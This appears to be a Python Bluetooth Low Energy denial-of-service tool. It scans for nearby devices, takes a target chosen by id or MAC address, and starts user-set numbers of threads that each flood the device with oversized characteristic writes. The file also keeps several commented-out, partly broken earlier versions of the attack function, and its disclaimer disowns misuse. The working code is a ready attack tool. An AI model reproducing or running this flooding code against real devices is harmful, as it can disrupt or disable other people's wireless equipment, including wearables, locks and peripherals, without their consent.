# import asyncio
# from bleak import BleakScanner

# from dataclasses import dataclass


# @dataclass
# class BL_Device:
#     name: str | None = None
#     mac_address: str | None = None

#     def __repr__(self) -> str:
#         return f"Device Name | Mac Address >> {self.name} | {self.mac_address}"


# async def scan():
#     devices = await BleakScanner.discover()
#     # for device in devices:
#     #     # print(device.details)
#     #     print(f"Device: {device.name} ({device.address})")
#     yield devices


# async def main():
#     async with scan() as s:
#         while True:
#             print(next(s))


import os
import threading
import time
from bluepy import btle
from rich import print
from rich.console import Console
from rich.panel import Panel

console = Console()

# def DOS(target_addr, packages_size):
#     # Create a BLE socket
#     console.print("[bold green]Creating BLE socket...[/bold green]")
#     sock = btle.BluepyHelper()

#     # Connect to the target device
#     try:
#         console.print(f"[bold green]Connecting to {target_addr}...[/bold green]")
#         sock.connect(target_addr)
#     except btle.BTLEException as e:
#         console.print(f"[bold red]Error: {e}[/bold red]")
#         return

#     # Send a large number of packets
#     console.print("[bold green]Starting DoS attack...[/bold green]")
#     payload = b'x' * packages_size
#     while True:
#         try:
#             sock.send(payload)
#         except btle.BTLEException:
#             break

#     # Close the socket
#     console.print("[bold green]Closing BLE socket...[/bold green]")
#     sock.disconnect()

# def DOS(target_addr, packages_size):
#     # Create a BLE socket
#     console.print("[bold green]Creating BLE socket...[/bold green]")
#     sock = btle.BluepyHelper()

#     # Connect to the target device
#     try:
#         console.print(f"[bold green]Connecting to {target_addr}...[/bold green]")
#         sock.
#         # connectPeripheral(target_addr)
#     except btle.BTLEException as e:
#         console.print(f"[bold red]Error: {e}[/bold red]")
#         return

#     # Send a large number of packets
#     console.print("[bold green]Starting DoS attack...[/bold green]")
#     payload = b'x' * packages_size
#     while True:
#         try:
#             sock.sendRawData(payload)
#         except btle.BTLEException:
#             break

#     # Close the socket
#     console.print("[bold green]Closing BLE socket...[/bold green]")
#     sock.disconnect()

from bluepy.btle import Peripheral


def DOS(target_addr, packages_size):
    # # Create a BLE peripheral object
    # console.print("[bold green]Creating BLE peripheral...[/bold green]")
    # try:
    #     peripheral = Peripheral(target_addr)
    # except btle.BTLEException as e:
    #     console.print(f"[bold red]Error: {e}[/bold red]")
    #     return
    console.print("[bold green]Creating BLE peripheral...[/bold green]")
    try:
        peripheral = Peripheral(str(target_addr))  # Convert target_addr to a string
    except btle.BTLEException as e:
        console.print(f"[bold red]Error: {e}[/bold red]")
        return

    # Connect to the target device
    try:
        console.print(f"[bold green]Connecting to {target_addr}...[/bold green]")
        peripheral.connect()
    except btle.BTLEException as e:
        console.print(f"[bold red]Error: {e}[/bold red]")
        console.log("Locals:\n",log_locals=True)
        return

    # Send a large number of packets
    console.print("[bold green]Starting DoS attack...[/bold green]")
    payload = b"x" * packages_size
    while True:
        try:
            peripheral.writeCharacteristic(
                0x0E, payload, True
            )  # Replace with the characteristic UUID
        except btle.BTLEException:
            console.log("Locals:\n",log_locals=True)

            break

    # Disconnect and clean up
    console.print("[bold green]Closing BLE connection...[/bold green]")
    peripheral.disconnect()


def printLogo():
    logo = """
[bold cyan]
 ██████╗██╗   ██╗███████╗███╗   ███╗███████╗
██╔════╝██║   ██║██╔════╝████╗ ████║██╔════╝
██║     ██║   ██║█████╗  ██╔████╔██║█████╗
██║     ██║   ██║██╔══╝  ██║╚██╔╝██║██╔══╝
╚██████╗╚██████╔╝███████╗██║ ╚═╝ ██║███████╗
 ╚═════╝ ╚═════╝ ╚══════╝╚═╝     ╚═╝╚══════╝
[/bold cyan]"""
    console.print(Panel(logo, title="[bold red]Bluetooth DoS Script[/bold red]"))


def main():
    printLogo()
    time.sleep(0.1)

    disclaimer = """[bold red]
THIS SOFTWARE IS PROVIDED "AS IS" WITHOUT WARRANTY OF ANY KIND. YOU MAY USE THIS SOFTWARE AT YOUR OWN RISK. THE USE IS COMPLETE RESPONSIBILITY OF THE END-USER. THE DEVELOPERS ASSUME NO LIABILITY AND ARE NOT RESPONSIBLE FOR ANY MISUSE OR DAMAGE CAUSED BY THIS PROGRAM.[/bold red]
"""
    console.print(Panel(disclaimer, title="[bold red]Disclaimer[/bold red]"))

    if console.input("[green]Do you agree? (y/n) > [/green]").lower() in ["y", "yes"]:
        os.system("clear")
        printLogo()
        console.print("[bold green]Scanning for Bluetooth devices...[/bold green]")
        devices_dict = btle.Scanner().scan(10.0)  # Store the result in a dictionary
        devices = list(devices_dict.values())  # Convert dict_values to a list

        console.print("[bold green]Discovered devices:[/bold green]")
        id = 0
        for device in devices:
            console.print(f"[cyan]{id}[/cyan] [green]{device.addr}[/green]")
            id += 1

        target_id = console.input("[green]Target id or mac > [/green]")
        try:
            target_device = devices[int(target_id)]
            target_addr = target_device.addr
        except (IndexError, ValueError):
            target_addr = target_id
        if len(target_addr) < 1:
            console.print("[bold red]Error: Target address is missing[/bold red]")
            exit(0)

        packages_size = console.input("[green]Packages size > [/green]")
        if not packages_size.isdigit():
            console.print(
                "[bold red]Error: Packages size must be an integer[/bold red]"
            )
            exit(0)
        packages_size = int(packages_size)

        threads_count = console.input("[green]Threads count > [/green]")
        if not threads_count.isdigit():
            console.print(
                "[bold red]Error: Threads count must be an integer[/bold red]"
            )
            exit(0)
        threads_count = int(threads_count)

        console.print("[bold green]Starting DoS attack in 3 seconds...[/bold green]")
        for i in range(3, 0, -1):
            console.print(f"[bold green]{i}[/bold green]")
            time.sleep(1)

        console.print("[bold green]Building threads...[/bold green]")
        for i in range(threads_count):
            console.print(f"[bold green]Built thread №{i + 1}[/bold green]")
            threading.Thread(target=DOS, args=[str(target_addr), packages_size]).start()

        console.print("[bold green]Built all threads...[/bold green]")
        console.print("[bold green]Starting DoS attack...[/bold green]")
    else:
        console.print("[bold red]Exiting...[/bold red]")
        exit(0)


if __name__ == "__main__":
    try:
        os.system("clear")
        main()
    except KeyboardInterrupt:
        console.print("\n[bold red]Aborted[/bold red]")
        exit(0)
    except Exception as e:
        console.print(f"[bold red]Error: {e}[/bold red]")
        console.log("Locals:\n",log_locals=True)


# asyncio.run(main())
